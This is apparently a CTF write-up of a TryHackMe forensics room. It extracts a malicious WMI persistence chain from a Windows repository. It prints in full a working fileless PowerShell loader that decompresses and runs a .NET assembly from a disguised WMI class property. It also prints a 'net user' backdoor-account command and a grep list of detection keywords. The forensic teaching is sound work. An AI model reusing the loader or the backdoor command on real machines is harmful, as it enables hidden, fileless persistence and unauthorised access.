# TryHackMe: After Hours — Walkthrough

**Room:** After Hours (Hacker Holidays — Day 12, The Byte Lotus Hotel)
**Category:** Forensics — Windows / WMI / Reverse Engineering
**Difficulty:** Medium

Bar closed. Guests asleep. Something on the network just clocked in for a shift off the rotation.

---

## 1. Reading the Room Briefing First

> "Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Someone, or something, has been logging in during the small hours, well after the night-shift technician has gone home.
>
> Nothing obvious shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever's keeping itself alive is hiding somewhere quieter, tucked away in a corner of the system most tools don't think to check."

Plus @0xMia's hint:

> "for anyone stuck rn: the usual autoruns/tools straight up don't catch this one 💀 you're gonna have to dig through the raw data by hand"

Two things to take away before opening a single file:

- **"Not in Startup, Scheduled Tasks, or Run keys"** rules out the three most common Windows persistence locations by name — deliberately, so we don't waste time checking them.
- **"A corner most tools don't think to check" + "dig through the raw data by hand"** points at something autorun-scanning tools genuinely don't enumerate as a persistence location. **WMI (Windows Management Instrumentation) event subscriptions and custom classes** fit this description precisely — WMI persistence is a well-known technique specifically *because* most autorun checkers don't look inside the WMI repository's raw storage.

## 2. Identifying the Artifacts

The room provides five files:
```
INDEX.BTR
MAPPING1.MAP
MAPPING2.MAP
MAPPING3.MAP
OBJECTS.DATA
```

This exact file set — `INDEX.BTR`, three `MAPPING*.MAP` files, and `OBJECTS.DATA` — is the standard on-disk layout of a **Windows WMI repository** (normally found at `C:\Windows\System32\wbem\Repository\`). `OBJECTS.DATA` is the file that actually holds serialized class and instance data; the `.MAP` files and `INDEX.BTR` are indexing/lookup structures the WMI engine uses to find records inside `OBJECTS.DATA` — for our purposes, `OBJECTS.DATA` is where the interesting content lives, so that's where we focus.

## 3. Extracting Strings — and Why Two Encodings Matter

```bash
strings -a -n 6 OBJECTS.DATA > ascii.txt
strings -a -el -n 6 OBJECTS.DATA > utf16.txt
wc -l ascii.txt utf16.txt
```

**Why two separate runs:** `strings` by default only extracts sequences of printable *8-bit* (ASCII) characters. Windows, however, is UTF-16LE-native internally — file names, class names, and especially any embedded PowerShell (PowerShell itself widely uses UTF-16LE, and `-EncodedCommand` payloads specifically *require* it) are frequently stored as UTF-16LE rather than plain ASCII. `strings -el` tells `strings` to look for **e**xtended (16-bit) **l**ittle-endian character sequences instead. Running both catches content that would otherwise be invisible to a single pass — this is a general habit worth keeping for any Windows-artifact forensics, not just WMI.

`-n 6` sets a minimum string length of 6, filtering out short noise while still catching meaningful content.

This produced **366,740** ASCII strings and **12,096** UTF-16LE strings — far too many to read manually, so the next step is narrowing down productively.

## 4. First Pass — Keyword Search (and Why It Wasn't Enough Alone)

```bash
grep -Ein 'powershell|cmd\.exe|wscript|cscript|payload|encoded|base64|FromBase64|IEX|Invoke-|CommandLine|EventConsumer|EventFilter|FilterToConsumer|ActiveScript|root\\cimv2' ascii.txt utf16.txt
```

The reasoning here: WMI persistence commonly works through **Event Filters/Consumers** (`__EventFilter`, `CommandLineEventConsumer`, `__FilterToConsumerBinding`) that trigger a script or command on some system event. Searching for those class names plus common execution keywords (`powershell`, `IEX`, `FromBase64`) is the natural first move.

In practice, this search was noisy and inconclusive on its own — the WMI repository legitimately contains huge amounts of boilerplate class/namespace text that happens to include generic words like "script" or fragments of legitimate class names, so a keyword grep alone doesn't cleanly separate signal from the normal repository noise. It's not a wasted step (it confirms the file is a real WMI repository and gives a feel for its structure), but it wasn't what actually found the payload.

## 5. Second Pass — Hunting for Base64 by Shape, Not Keyword

Since keyword search underdelivered, the better approach is searching for the *shape* of an embedded payload rather than words describing it: a long, unbroken run of Base64 alphabet characters is unmistakable regardless of what it's wrapped in or named.

```bash
grep -EIon '[A-Za-z0-9+/]{80,}={0,2}' ascii.txt utf16.txt | head -20
```

Breaking down the regex:
- `[A-Za-z0-9+/]{80,}` — at least 80 consecutive characters from the Base64 alphabet (letters, digits, `+`, `/`). 80 is an arbitrary but effective threshold — long enough to exclude short coincidental matches, short enough to still catch real payloads.
- `={0,2}` — optionally followed by up to two `=` padding characters, which Base64 uses at the end of a block when the input length isn't a multiple of 3.
- `-E` enables extended regex syntax (so `{80,}` works without escaping), `-I` skips binary-file warnings, `-o` prints only the matching portion of each line instead of the whole line, `-n` numbers the output... (note: in the actual run, `-n` was folded into `-Ion` flags combined, giving line numbers alongside the match).

This surfaced two distinct repeating patterns across many lines in `ascii.txt`:

- Several long strings starting with **`7VZPbFRFGP/...`** — length and shape suggested compressed binary data Base64-encoded.
- Several long strings starting with **`JABmAGkAbABlAC...`** — this specific prefix is recognizable on sight to anyone who's dealt with PowerShell before: it's the Base64 encoding of the UTF-16LE bytes for `$file ` (PowerShell's `-EncodedCommand` mechanism always Base64-encodes UTF-16LE text, and `$fi` is an extremely common opening for a PowerShell one-liner).

Both strings appeared multiple times at different offsets in the file — this is normal and expected for a WMI repository, which stores multiple copies/versions of class instance data as part of its internal structure; picking any one occurrence is sufficient.

## 6. Decoding the PowerShell Loader

Extracting one full copy of the `JABmAGkAbABlAC...` string and decoding it:

```bash
echo "JABmAGkAbABlAC..." | base64 -d | iconv -f UTF-16LE -t UTF-8
```

- `base64 -d` reverses the Base64 encoding, giving back raw bytes.
- `iconv -f UTF-16LE -t UTF-8` converts those raw bytes from UTF-16LE (PowerShell's encoding) into UTF-8 so the terminal displays them as normal readable text. Skipping this step would show the script text interleaved with null bytes (since every ASCII character in UTF-16LE is followed by a `\x00` byte) — technically readable in some terminals but messy.

**Alternative if `iconv` isn't available:** Python's `bytes.decode('utf-16-le')` does the same job:
```bash
python3 -c "
import base64
data = base64.b64decode('JABmAGkAbABlAC...')
print(data.decode('utf-16-le'))
"
```

The decoded script:
```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream(
    [IO.MemoryStream][Convert]::FromBase64String($file),
    [IO.Compression.CompressionMode]::Decompress
);
$b = New-Object Byte[](1024);
$r = $d.Read($b, 0, 1024);
while ($r -gt 0) {
    $o.Write($b, 0, $r);
    $r = $d.Read($b, 0, 1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke(
    $null,
    @(,[string[]]@())
) | Out-Null
```

This is the whole persistence mechanism laid bare. Reading it line by line:
1. It doesn't touch disk at all for its payload — it reads a **custom WMI class property** (`Win32_HardwareTelemetry.ConfigData`) that was planted directly in the repository. The `Win32_` prefix is a deliberate disguise: dozens of legitimate Windows classes use that exact prefix (`Win32_Process`, `Win32_Service`, etc.), so a class named `Win32_HardwareTelemetry` blends in visually with real system inventory during casual inspection.
2. The value is Base64-decoded, then run through `DeflateStream` in decompress mode — meaning the stored payload is compressed to save space and further obscure it from a casual string scan.
3. The decompressed bytes are loaded directly into memory as a .NET assembly (`[Reflection.Assembly]::Load(...)`) and its entry point is invoked immediately — **fileless execution**. No `.exe` ever touches disk in this chain, which is exactly why file-based malware scanners and Startup/Run-key checks never see anything.

This single script explains the entire "hiding somewhere quieter" framing: the payload lives as *data inside a WMI class property*, not as a file or a registry value.

## 7. Extracting and Decoding the Actual Payload

Now that we know what to look for (`Win32_HardwareTelemetry`'s `ConfigData`), we go back for the other long Base64 string we found — the `7VZPbFRFGP/...` one — since that's the `$file` value the script above reads.

```bash
grep -o '7VZPbFRFGP/[A-Za-z0-9+/=]*' ascii.txt | sort -u | head -1 > payload.b64
```
- `grep -o` with a pattern anchored on the known prefix extracts just the matching payload string cleanly (avoiding any surrounding repository noise on the same line).
- `sort -u` deduplicates, since the same string appears at multiple offsets in the file.
- `head -1` takes a single copy, since they're all identical.

```bash
base64 -d payload.b64 > payload.deflate
file payload.deflate
```
`file` reports this as generic `data` — expected, since raw DEFLATE-compressed data has no distinctive magic bytes of its own (unlike gzip or zip, which wrap DEFLATE streams in a header `file` can recognize).

Decompressing it requires matching exactly what the PowerShell script used — `System.IO.Compression.DeflateStream`, which implements **raw DEFLATE** (no zlib or gzip wrapper). Python's `zlib` module can decompress raw DEFLATE too, but needs to be told explicitly not to expect a zlib header:

```python
import zlib
data = open("payload.deflate", "rb").read()
out = zlib.decompress(data, -15)
open("payload.exe", "wb").write(out)
```

The `-15` argument is the key detail: `zlib.decompress()`'s second argument is `wbits` (window bits). A **positive** value tells zlib to expect a standard zlib-wrapped stream (with its own header/checksum). A **negative** value (`-15`, the maximum window size expressed as negative) tells zlib to treat the input as **raw** DEFLATE data with no wrapper at all — exactly matching what .NET's `DeflateStream` produces. Using a positive value here would fail with a "incorrect header check" error.

```bash
file payload.exe
```
```
payload.exe: PE32 executable for MS Windows 4.00 (GUI), Intel i386 Mono/.Net assembly, 3 sections
```

Confirmed: a genuine 4096-byte .NET executable, extracted entirely from data embedded inside the WMI repository.

## 8. Dead End — Decompiler Tooling Friction

The natural next step for inspecting a small .NET assembly is a decompiler. Two attempts here hit friction worth documenting, since they're common enough issues to expect again elsewhere:

**`ilspycmd` (dotnet global tool) crashed outright:**
```
Unhandled exception. System.InvalidOperationException: The terminfo database is invalid.
   at System.TermInfo.Database.ReadDatabase(...)
   ...
   at Microsoft.DotNet.Cli.Program.Main(String[] args)
```
This is a known class of issue where the .NET CLI's console-color handling fails to find a valid `terminfo` entry for the current terminal (common in minimal/headless Linux environments, certain terminal emulators, or unusual `$TERM` values). The practical fix is usually `export TERM=xterm` before invoking `dotnet`, since that guarantees a `terminfo` entry the runtime can find — but this wasn't pursued further once a faster path presented itself (see below).

**`mono-utils`/`mono-devel` (for `monodis`, a lighter IL disassembler) was a ~65MB download** that was interrupted to save time, since a much faster option was still untried.

**The lesson:** before reaching for a full decompiler, it's worth trying the cheapest possible tool first — plain `strings` — especially on a *small* binary. A 4096-byte assembly doesn't have room to hide much; whatever strings it references are very likely sitting in the string heap in plain UTF-16LE, decompiler or not.

## 9. The Fast Path — `strings` on the Assembly Itself (Same Encoding Lesson, Again)

The very first `strings` attempt on `payload.exe` used the default 8-bit mode and only turned up structural metadata (`<Module>`, `mscorlib`, method/property names like `get_MachineName`, `set_FileName`, `set_Arguments`) — useful for confirming *what kind* of logic the program contains (environment/hostname checking, then launching a process with configurable filename/arguments), but not the actual string *values* being compared or passed.

This is the exact same lesson from Step 3, applied again: **.NET string literals are stored in the assembly's `#US` (User Strings) heap as UTF-16LE**, just like the WMI repository data was. The fix is identical:

```bash
strings -a -el -n 4 payload.exe
```

This time the actual literal values appeared directly:
```
bytelotusdc
cmd.exe
/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
Execution halted: Environment mismatch.
```

This alone tells the complete story without needing a decompiler at all:
- The payload checks `Environment.MachineName` against the literal `bytelotusdc` (matching the earlier `get_MachineName` / `Equals` strings seen in the narrow scan — now we have the actual comparison value).
- If it matches, it shells out to `cmd.exe /c net user patch <password> /add` — creating a local Windows account named **`patch`** with an embedded password.
- If it doesn't match, it prints `Execution halted: Environment mismatch.` and presumably exits — a built-in environment check, likely to avoid the payload doing anything when run outside its intended target (or, in a CTF context, to make clear this analysis is expected to happen statically/via extraction rather than actual execution).

**Alternative approaches that would also work from here**, for completeness:
- **Decompile properly with ILSpy/dnSpy** (on Windows, or `ilspycmd` once the `TERM` issue above is worked around) to see the exact C# source — useful if the logic were more complex than a simple string comparison + process launch, but unnecessary here since `strings` already gave us everything.
- **Disassemble with `monodis`** to IL-level pseudocode — a middle ground between raw strings and full decompilation.
- **Run it in an isolated Windows VM** with the machine renamed to `bytelotusdc` and observe the account creation directly — the most "realistic" approach but far slower than static analysis for a CTF.

## 10. Decoding the Flag

The password passed to `net user patch <password> /add` is itself Base64:
```
VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9
```

```bash
echo "VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9" | base64 -d
```

Decodes directly to the flag.

---

## Summary of the Chain

| Stage | Technique | Result |
|---|---|---|
| Artifact ID | Recognized `INDEX.BTR` / `MAPPING*.MAP` / `OBJECTS.DATA` as a WMI repository | Knew where to focus (`OBJECTS.DATA`) and why standard autoruns tools miss this persistence class |
| String extraction | `strings -a -n 6` (ASCII) **and** `strings -a -el -n 6` (UTF-16LE) | Caught both encodings — critical, since key content was UTF-16LE |
| Keyword search | grep for `powershell`, `EventConsumer`, `FromBase64`, etc. | Confirmed the file's nature but too noisy to isolate the payload alone |
| Shape-based search | `grep -EIon '[A-Za-z0-9+/]{80,}={0,2}'` — searched for the *pattern* of Base64, not keywords | Found two distinct long Base64 blobs: a PowerShell loader and its target payload |
| Loader decode | `base64 -d` piped to `iconv -f UTF-16LE -t UTF-8` (or Python `.decode('utf-16-le')`) | Revealed the full loader script: reads `Win32_HardwareTelemetry.ConfigData`, DEFLATE-decompresses it, loads it as a .NET assembly in memory |
| Payload extraction | `base64 -d` → `zlib.decompress(data, -15)` (raw DEFLATE, no header) | Recovered a genuine 4096-byte PE32 .NET assembly |
| Dead end | `ilspycmd` crashed on a `terminfo` error; `mono-utils` install was slow/interrupted | Both are real, fixable friction points, but not worth chasing given the binary's small size |
| Fast path | `strings -a -el -n 4` on the assembly itself — same UTF-16LE lesson applied twice | Directly revealed the hostname check (`bytelotusdc`), the `net user patch <pass> /add` command, and the embedded Base64 password |
| Payoff | `base64 -d` on the embedded password | Flag recovered |

**Key takeaway:** this room's central technical lesson is really the same insight applied recursively at three different layers — the WMI repository data, the PowerShell loader's encoding, and the .NET assembly's string heap all use UTF-16LE, and a plain ASCII `strings` pass silently misses content at every one of those layers. Running `strings -el` alongside the default pass — as a standing habit for *any* Windows artifact, not just this room — would have shortcut several dead ends here. The second lesson is more general: when a keyword search on a large, noisy corpus underperforms, searching for the *shape* of what you're looking for (a long Base64 run, in this case) is often far more effective than trying to guess the right vocabulary.

*(Flag intentionally omitted from this writeup — run the extraction yourself against your own copy of the artifacts to recover it.)*
